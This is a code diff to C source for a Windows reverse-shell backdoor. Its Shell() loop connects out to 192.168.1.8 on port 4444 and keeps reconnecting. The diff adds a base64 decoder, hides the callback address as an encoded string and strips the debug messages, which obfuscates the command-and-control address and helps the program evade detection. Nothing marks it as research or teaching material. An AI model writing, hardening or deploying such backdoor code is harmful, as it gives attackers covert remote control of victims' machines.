@@ -15,6 +15,75 @@
 #define BUFFER_SIZE 8192
 
 int sock;
+char ip_encoded[] = "MTkyLjE2OC4xLjg=";
+
+char* base64_decode(const char *input) {
+    char *output;
+    const char *base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+    int i = 0;
+    int in = 0;
+    unsigned char char_array_4[4];
+    unsigned char char_array_3[3];
+    int output_len = 0;
+    
+    int input_len = (int)strlen(input);
+    int estimated_len = (input_len / 4) * 3 + 3;
+    output = (char*)malloc(estimated_len + 1);
+    if (!output) return NULL;
+    
+    memset(output, 0, (size_t)(estimated_len + 1));
+    
+    while (input[in] && input[in] != '=') {
+        char_array_4[i++] = (unsigned char)input[in];
+        in++;
+        
+        if (i == 4) {
+            for (i = 0; i < 4; i++) {
+                char *ptr = strchr(base64_chars, (char)char_array_4[i]);
+                if (ptr) {
+                    char_array_4[i] = (unsigned char)(ptr - base64_chars);
+                } else {
+                    char_array_4[i] = 0;
+                }
+            }
+            
+            char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
+            char_array_3[1] = (unsigned char)(((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2));
+            char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x03) << 6) + char_array_4[3]);
+            
+            for (i = 0; i < 3; i++) {
+                output[output_len++] = (char)char_array_3[i];
+            }
+            i = 0;
+        }
+    }
+    
+    if (i) {
+        for (int k = i; k < 4; k++) {
+            char_array_4[k] = 0;
+        }
+        
+        for (int k = 0; k < 4; k++) {
+            char *ptr = strchr(base64_chars, (char)char_array_4[k]);
+            if (ptr) {
+                char_array_4[k] = (unsigned char)(ptr - base64_chars);
+            } else {
+                char_array_4[k] = 0;
+            }
+        }
+        
+        char_array_3[0] = (unsigned char)((char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4));
+        char_array_3[1] = (unsigned char)(((char_array_4[1] & 0x0f) << 4) + ((char_array_4[2] & 0x3c) >> 2));
+        char_array_3[2] = (unsigned char)(((char_array_4[2] & 0x03) << 6) + char_array_4[3]);
+        
+        for (int k = 0; k < i - 1; k++) {
+            output[output_len++] = (char)char_array_3[k];
+        }
+    }
+    
+    output[output_len] = '\0';
+    return output;
+}
 
 int bootRun()
 {
@@ -178,11 +247,11 @@ void Shell() {
     char container[1024];
     char total_response[18384];
     int bytes_received;
+    char *ip = base64_decode(ip_encoded);
 
     while (1) {
         bytes_received = recv(sock, buffer, 1, MSG_PEEK);
         if (bytes_received == SOCKET_ERROR || bytes_received == 0) {
-            printf("trying connect...\n");
             closesocket(sock);
             
             struct sockaddr_in ServAddr;
@@ -193,14 +262,13 @@ void Shell() {
             
             memset(&ServAddr, 0, sizeof(ServAddr));
             ServAddr.sin_family = AF_INET;
-            ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
+            ServAddr.sin_addr.s_addr = inet_addr(ip);
             ServAddr.sin_port = htons(4444);
             
             while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
                 Sleep(10000);
             }
             
-            printf("reconected!\n");
             continue;
         }
 
@@ -219,7 +287,7 @@ void Shell() {
             
             memset(&ServAddr, 0, sizeof(ServAddr));
             ServAddr.sin_family = AF_INET;
-            ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
+            ServAddr.sin_addr.s_addr = inet_addr(ip);
             ServAddr.sin_port = htons(4444);
             
             while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
@@ -286,6 +354,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 
     struct sockaddr_in ServAddr;
     WSADATA wsaData;
+    char *ip = base64_decode(ip_encoded);
 
     if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {
         exit(1);
@@ -296,7 +365,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
         
         memset(&ServAddr, 0, sizeof(ServAddr));
         ServAddr.sin_family = AF_INET;
-        ServAddr.sin_addr.s_addr = inet_addr("192.168.1.8");
+        ServAddr.sin_addr.s_addr = inet_addr(ip);
         ServAddr.sin_port = htons(4444);
 
         while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) {
